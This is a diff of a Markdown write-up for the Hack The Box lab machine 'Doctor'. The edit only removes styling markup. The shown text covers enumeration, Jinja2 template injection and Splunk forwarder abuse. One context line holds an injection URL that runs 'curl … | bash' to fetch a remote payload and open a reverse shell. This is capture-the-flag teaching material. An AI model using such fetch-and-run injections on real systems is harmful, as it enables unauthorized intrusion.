@@ -15,12 +15,12 @@ title: 'Walktrough: HTB Doctor'
 ---
 Hello everyone!
 
-Starting to post about some write-ups of CTF-like machines, the first one will be **Doctor**, an easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu) created by [egotisticalSW](https://app.hackthebox.eu/users/94858).<!--more-->
+Starting to post about some write-ups of CTF-like machines, the first one will be **Doctor**, an easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu) created by [egotisticalSW](https://app.hackthebox.eu/users/94858). [more]
 
 :information_source: **Info**: Write-ups for Hack The Box will be posted as soon as machines get retired, so here's the first one :smiley:!
-{: .notice--info}
 
-![HTB Doctor](https://i.imgur.com/9JHTf6G.png){: .align-center}
+
+![HTB Doctor](https://i.imgur.com/9JHTf6G.png)
 
 ## Enumeration
 
@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 63.98 seconds
 
 Before starting the enumeration, checking the website using a browser, noticed that it is an institutional site, that mentions an e-mail **info@doctors.htb**, where the domain `doctors.htb` might be the FQDN of this machine.
 
-![HTB Doctor - 80/TCP](https://i.imgur.com/1nI88F7.png){: .align-center}
+![HTB Doctor - 80/TCP](https://i.imgur.com/1nI88F7.png)
 
 To ensure proper enumeration of HTTP services that might be using DNS, changed local hosts file to reflect the correct name so we could also start enumerating the services.
 
@@ -86,7 +86,7 @@ ff02::2 ip6-allrouters
 
 After changing the entry, once accessing the same URL, a different page is displayed, as seen below:
 
-![HTB Doctor - Secure Messaging](https://i.imgur.com/dFm4t4L.png){: .align-center}
+![HTB Doctor - Secure Messaging](https://i.imgur.com/dFm4t4L.png)
 
 Now that we have confirmed that the box contained a different content being hosted using the DNS, we'll start enumerating these websites using both ways so we can look for interesting opportunities for an initial foothold.
 
@@ -103,11 +103,11 @@ While checking the website I have noticed that on login page would be possible a
 
 After some further testing, including checking the possibility to tamper with the change password request, I decided to change strategy and to try to create an account.
 
-![HTB Doctor - Secure Messaging - Creating User](https://i.imgur.com/TF2YP2x.png){: .align-center}
+![HTB Doctor - Secure Messaging - Creating User](https://i.imgur.com/TF2YP2x.png)
 
 After having one successfully created, the warning below is displayed, which means that **we'll only have 20 minutes** to use this recently created account.
 
-![HTB Doctor - Secure Messaging - Account creation](https://i.imgur.com/1HTEecu.png){: .align-center}
+![HTB Doctor - Secure Messaging - Account creation](https://i.imgur.com/1HTEecu.png)
 
 After having the account created, started enumerating the source code where I've found a `/archive` folder hidden in the page, but it didn't return anything when first accessed.
 
@@ -117,7 +117,7 @@ After having the account created, started enumerating the source code where I've
 
 So going further I noticed the possibility to add a new message, where I have created the following dummy content:
 
-![HTB Doctor - Secure Messaging - New Post](https://i.imgur.com/MRYzW8b.png){: .align-center}
+![HTB Doctor - Secure Messaging - New Post](https://i.imgur.com/MRYzW8b.png)
 
 Accessing the posted message afterward, I noticed that it redirects to `http://doctors.htb/post/2` but also nothing interesting besides the possibility of updating its content or deleting the message.
 
@@ -127,11 +127,11 @@ Things get interesting when I decided to access `/archive` again, where the cont
 
 To confirm this, following the guidance available on [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify) I've changed the Title from my previous message to test some types of injections and determine the engine used, which will help us define the malicious injection itself.
 
-![HTB Doctor - Secure Messaging - SSTI test](https://i.imgur.com/ZNQ6zGx.png){: .align-center}
+![HTB Doctor - Secure Messaging - SSTI test](https://i.imgur.com/ZNQ6zGx.png)
 
 This injection worked flawlessly, indicating that we're handling Twig or Jinja2 :smile: (what makes sense, once this web service, as noticed on whatweb, is **Werkzeug**, a very popular web application server normally used with Flask or Django).
 
-![HTB Doctor - SSTI output](https://i.imgur.com/7rUfMmO.png){: .align-center}
+![HTB Doctor - SSTI output](https://i.imgur.com/7rUfMmO.png)
 
 After a few tests, playing with the examples available at [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), I was able to confirm that the correct language to use would be **Jinja2**, once the content below worked properly, among others:
 
@@ -175,10 +175,10 @@ http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20ba
 
 - And voilà! A reverse shell was returned :smiley:
 
-![HTB Doctor - Exploit](https://i.imgur.com/j9kreyv.png){: .align-center}
+![HTB Doctor - Exploit](https://i.imgur.com/j9kreyv.png)
 
 **Bonus** To make it easier to regain an initial foothold, once the user account has a short validity of 20 minutes, I've created this python3 script to help on this task :smiley:. To use it just set up the listener and python web server, then the script will recreate the user, the message and then send a request to get the reverse shell again
-{: .notice--info}
+
 
 ```python
 #!/usr/bin/python3
@@ -345,9 +345,9 @@ After running `linpeas.sh` from [PEASS - Privilege Escalation Awesome Scripts SU
 
 After browsing it directly, once I have clicked on the **services** link, as image below, an authentication prompt was shown. As the only credential we had is shaun it was the first one tried, which resulted in success :smiley:.
 
-![HTB Doctor - Splunkd](https://i.imgur.com/4225CjU.png){: .align-center}
+![HTB Doctor - Splunkd](https://i.imgur.com/4225CjU.png)
 
-![HTB Doctor - Services](https://i.imgur.com/JdygFIg.png){: .align-center}
+![HTB Doctor - Services](https://i.imgur.com/JdygFIg.png)
 
 As we have credentials to log on to the Splunk Service, the next step is to find a way to get an RCE on this service. Doing some research I came across [Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper's Blog](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) that mentions [GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations](https://github.com/cnotin/SplunkWhisperer2), which is a tool that makes easier to get a command execution from the access we already have.
 
